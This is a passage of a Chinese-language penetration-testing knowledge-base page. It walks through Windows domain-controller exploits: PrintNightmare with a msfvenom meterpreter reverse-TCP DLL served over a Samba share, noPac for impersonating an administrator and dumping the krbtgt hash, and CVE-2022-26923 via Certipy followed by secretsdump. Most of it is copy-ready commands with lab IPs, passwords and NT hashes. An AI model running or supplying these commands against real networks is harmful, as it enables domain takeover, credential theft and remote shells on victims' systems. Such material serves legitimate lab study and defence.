class="token plain">misc::printnightmare /server:172.16.93.15 /authuser:d4m1ts /authpassword:KsadiN8A.as221 /library:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">\</span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.93.2</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">smb</span><span class="token punctuation" style="color:#393A34">\</span><span class="token number" style="color:#36acaa">1</span><span class="token plain">.dll /nodynamic</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>如果出现错误 <code>impacket.dcerpc.v5.rpcrt.DCERPCException: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied</code>，可能和搭建的smb服务有关系，建议换linux搭建。</p>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞利用2kalilinux">漏洞利用2：Kali/Linux<a href="#漏洞利用2kalilinux" class="hash-link" aria-label="漏洞利用2：Kali/Linux的直接链接" title="漏洞利用2：Kali/Linux的直接链接">​</a></h3>
<blockquote>
<p>需要目标能访问到我们smb，所以这个属于备选项，实战环境可以找目标的linux系统进行配置。</p>
</blockquote>
<p>修改smb的配置文件，路径为：<code>/etc/samba/smb.conf</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> /etc/samba/smb.conf /etc/samba/smb.conf.bak</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">vim</span><span class="token plain"> /etc/samba/smb.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 内容如下：</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">global</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	workgroup </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> WORKGROUP </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	server string </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Samba Server </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	netbios name </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> MYSERVER </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	log </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> /var/log/samba/log.%m </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	max log size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	security </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> user </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	map to guest </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Bad User </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">smb</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	comment </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Template Directories </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	browseable </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	writeable </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	path </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> /tmp/ </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	guest ok </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">yes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>启动smb服务</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">service</span><span class="token plain"> smbd start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">service</span><span class="token plain"> smbd status</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>使用 <a href="https://github.com/cube0x0/CVE-2021-1675" target="_blank" rel="noopener noreferrer">CVE-2021-1675</a> POC进行攻击（需要看文档安装指定版本的impacket。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 先生成恶意的dll</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> /tmp </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/meterpreter/reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.17 </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">4444</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> dll </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 执行命令让DC加载恶意的dll</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 CVE-2021-1675.py org.gm7/d4m1ts:KsadiN8A.as221@172.16.93.15 </span><span class="token string" style="color:#e3116c">&#x27;\\172.16.93.17\smb\1.dll&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>我这里虽然报错了，但还是成功了</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20240424上午102601556" src="/assets/images/image-20240424上午102601556-6bf2d9075fee0b3c7e74aad1b195a38b.png" width="3614" height="860" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cve-2021-42287cve-2021-42278nopac">CVE-2021-42287&amp;CVE-2021-42278（noPac）<a href="#cve-2021-42287cve-2021-42278nopac" class="hash-link" aria-label="CVE-2021-42287&amp;CVE-2021-42278（noPac）的直接链接" title="CVE-2021-42287&amp;CVE-2021-42278（noPac）的直接链接">​</a></h2>
<p><code>CVE-2021-42278</code>：机器账户的名字一般来说应该以<code>$</code>结尾，但AD没有对域内机器账户名做验证。</p>
<p><code>CVE-2021-42287</code>，与上述漏洞配合使用，当请求服务 ST 的账户没有被 KDC 找到时，KDC 会自动在尾部添加 $ 重新搜索。创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS Ticket，接着DC在<code>TGS_REP</code>阶段，这个账户不存在的时候，DC会使用自己的密钥加密 <code>TGS Ticket</code>，提供一个属于该账户的<code>PAC</code>，然后我们就得到了一个高权限ST。</p>
<p><strong>利用流程：</strong></p>
<p>假如域内有一台域控名为 PDC（域控对应的机器用户为 PDC$），此时攻击者利用漏洞 CVE-2021-42287 创建一个机器用户  xxxxxx，再把机器用户 xxxxxx 的 sAMAccountName 改成 PDC。然后利用 PDC 去申请一个TGT票据。再把  PDC 的sAMAccountName 改回来 xxxxxx。这个时候 KDC 就会判断域内没有 PDC 这个用户，自动去搜索  PDC$（PDC$是域控PDC的sAMAccountName），攻击者利用刚刚申请的 TGT 进行 <code>S4U2self</code>，模拟域内的域管去请求域控 PDC 的 ST 票据，最终获得域控制器DC的权限。</p>
<p><strong>利用工具：</strong></p>
<p>需要一个域账户，使用工具 <a href="https://github.com/Ridter/noPac" target="_blank" rel="noopener noreferrer">noPac</a>，也可以使用<a href="https://github.com/safebuffer/sam-the-admin" target="_blank" rel="noopener noreferrer"><code>sam-the-admin</code></a></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 noPac.py org.gm7/d4m1ts:</span><span class="token string" style="color:#e3116c">&#x27;KsadiN8A.as221&#x27;</span><span class="token plain"> -dc-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15 -dc-host PDC </span><span class="token parameter variable" style="color:#36acaa">--impersonate</span><span class="token plain"> administrator </span><span class="token parameter variable" style="color:#36acaa">-shell</span><span class="token plain"> -use-ldap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 noPac.py org.gm7/d4m1ts:</span><span class="token string" style="color:#e3116c">&#x27;KsadiN8A.as221&#x27;</span><span class="token plain"> -dc-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15 -dc-host PDC </span><span class="token parameter variable" style="color:#36acaa">--impersonate</span><span class="token plain"> administrator </span><span class="token parameter variable" style="color:#36acaa">-dump</span><span class="token plain"> -use-ldap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 noPac.py org.gm7/d4m1ts:</span><span class="token string" style="color:#e3116c">&#x27;KsadiN8A.as221&#x27;</span><span class="token plain"> -dc-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15 -dc-host PDC </span><span class="token parameter variable" style="color:#36acaa">--impersonate</span><span class="token plain"> administrator </span><span class="token parameter variable" style="color:#36acaa">-dump</span><span class="token plain"> -just-dc-user org/krbtgt -use-ldap</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240422下午53820450" src="/assets/images/image-20240422下午53820450-d6058e3694a6a4fb4254183755882e5e.png" width="2592" height="906" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cve-2022-26923adcs">CVE-2022-26923（ADCS）<a href="#cve-2022-26923adcs" class="hash-link" aria-label="CVE-2022-26923（ADCS）的直接链接" title="CVE-2022-26923（ADCS）的直接链接">​</a></h2>
<p>当Windows系统的Active  Directory证书服务（CS）在域上运行时，由于机器账号中的 <code>dNSHostName</code> 属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从Active Directory证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限。这一漏洞最早由安全研究员Oliver  Lyak发现并公开分析过程和POC，微软在2022年5月的安全更新中对其进行了修补。</p>
<p><strong>利用工具：</strong></p>
<ul>
<li><a href="https://github.com/ly4k/Certipy.git" target="_blank" rel="noopener noreferrer">Certipy</a></li>
</ul>
<p><strong>利用过程：</strong></p>
<p>定位证书服务器</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 域内</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">certutil </span><span class="token parameter variable" style="color:#36acaa">-dump</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-v</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">certutil </span><span class="token parameter variable" style="color:#36acaa">-config</span><span class="token plain"> - </span><span class="token parameter variable" style="color:#36acaa">-ping</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 域外</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">certipy </span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> d4m1ts@org.gm7 </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> KsadiN8A.as221 -dc-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.3 </span><span class="token parameter variable" style="color:#36acaa">-scheme</span><span class="token plain"> ldap </span><span class="token parameter variable" style="color:#36acaa">-stdout</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>测试环境是否正常，能否利用</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 生成证书</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">certipy req </span><span class="token parameter variable" style="color:#36acaa">-username</span><span class="token plain"> d4m1ts@org.gm7 </span><span class="token parameter variable" style="color:#36acaa">-password</span><span class="token plain"> KsadiN8A.as221 </span><span class="token parameter variable" style="color:#36acaa">-ca</span><span class="token plain"> org-PDC-CA -target-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.3 -dc-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.3 </span><span class="token parameter variable" style="color:#36acaa">-template</span><span class="token plain"> User </span><span class="token parameter variable" style="color:#36acaa">-debug</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 验证证书</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">certipy auth </span><span class="token parameter variable" style="color:#36acaa">-pfx</span><span class="token plain"> d4m1ts.pfx -dc-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.3 </span><span class="token parameter variable" style="color:#36acaa">-debug</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 如果出现错误 KeyError: &#x27;1.2.840.10046.2.1&#x27;，换python版本，我用的kali的3.11没问题</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240423下午44052354" src="/assets/images/image-20240423下午44052354-ff8e7556812c7bdc6cace0d01464f98f.png" width="2334" height="790" class="img_ev3q"></p>
<p>利用</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 创建机器账户</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">certipy account create </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> d4m1ts@org.gm7 </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> KsadiN8A.as221 </span><span class="token parameter variable" style="color:#36acaa">-user</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;adcstest&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-dns</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;PDC.org.gm7&quot;</span><span class="token plain"> -target-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.3 -dc-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 申请CA证书</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">certipy req </span><span class="token parameter variable" style="color:#36acaa">-username</span><span class="token plain"> adcstest</span><span class="token punctuation" style="color:#393A34">\</span><span class="token variable" style="color:#36acaa">$@</span><span class="token plain">org.gm7 </span><span class="token parameter variable" style="color:#36acaa">-password</span><span class="token plain"> 2Zneo3PkrlXWrn23 </span><span class="token parameter variable" style="color:#36acaa">-ca</span><span class="token plain"> org-PDC-CA -target-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.3 -dc-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.3 </span><span class="token parameter variable" style="color:#36acaa">-template</span><span class="token plain"> Machine </span><span class="token parameter variable" style="color:#36acaa">-debug</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 获取machine account的NT hash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">certipy auth </span><span class="token parameter variable" style="color:#36acaa">-pfx</span><span class="token plain"> pdc.pfx -dc-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.3 </span><span class="token parameter variable" style="color:#36acaa">-debug</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240423下午45622313" src="/assets/images/image-20240423下午45622313-b36f165ca850b0dfa4d8cf685c633cd9.png" width="2370" height="1206" class="img_ev3q"></p>
<p>再通过域控机器账户的Hash拿到域管的Hash</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 /usr/share/doc/python3-impacket/examples/secretsdump.py </span><span class="token parameter variable" style="color:#36acaa">-hashes</span><span class="token plain"> aad3b435b51404eeaad3b435b51404ee:583d83e13250bfd2ff65f508b33f0973 org.gm7/</span><span class="token string" style="color:#e3116c">&#x27;pdc$&#x27;</span><span class="token plain">@172.16.93.3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240423下午50324193" src="/assets/images/image-20240423下午50324193-cb2ab2291d3b041353c6d2065fa1b2d8.png" width="2370" height="924" class="img_ev3q"></p>
<blockquote>
<p>如果出现问题 <code>AttributeError: module &#x27;lib&#x27; has no attribute &#x27;X509_V_FLAG_NOTIFY_POLICY&#x27;. Did you mean: &#x27;X509_V_FLAG_EXPLICIT_POLICY&#x27;?</code>，那么pip3安装 <code>pyopenssl==24.0.0</code>即可。</p>
</blockquote></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/渗透测试/内网渗透/横向移动/NTLM_Relay"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">NTLM_Relay</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/渗透测试/内网渗透/横向移动/exchange相关漏洞"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">exchange相关漏洞</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#cve-2014-6324ms14-068" class="table-of-contents__link toc-highlight">CVE-2014-6324（MS14-068）</a></li><li><a href="#cve-2020-1472zerologon" class="table-of-contents__link toc-highlight">CVE-2020-1472（Zerologon）</a><ul><li><a href="#漏洞利用1使用github的脚本" class="table-of-contents__link toc-highlight">漏洞利用1：使用GitHub的脚本</a></li><li><a href="#漏洞利用2使用mimikatz" class="table-of-contents__link toc-highlight">漏洞利用2：使用mimikatz</a></li></ul></li><li><a href="#cve-2021-1675cve-2021-34527printnightmare" class="table-of-contents__link toc-highlight">CVE-2021-1675/CVE-2021-34527（PrintNightMare）</a><ul><li><a href="#探测" class="table-of-contents__link toc-highlight">探测</a></li><li><a href="#漏洞利用1内网windows" class="table-of-contents__link toc-highlight">漏洞利用1：内网windows</a></li><li><a href="#漏洞利用2kalilinux" class="table-of-contents__link toc-highlight">漏洞利用2：Kali/Linux</a></li></ul></li><li><a href="#cve-2021-42287cve-2021-42278nopac" class="table-of-contents__link toc-highlight">CVE-2021-42287&amp;CVE-2021-42278（noPac）</a></li><li><a href="#cve-2022-26923adcs" class="table-of-contents__link toc-highlight">CVE-2022-26923（ADCS）</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库.</div></div></div></footer></div>
</body>
</html>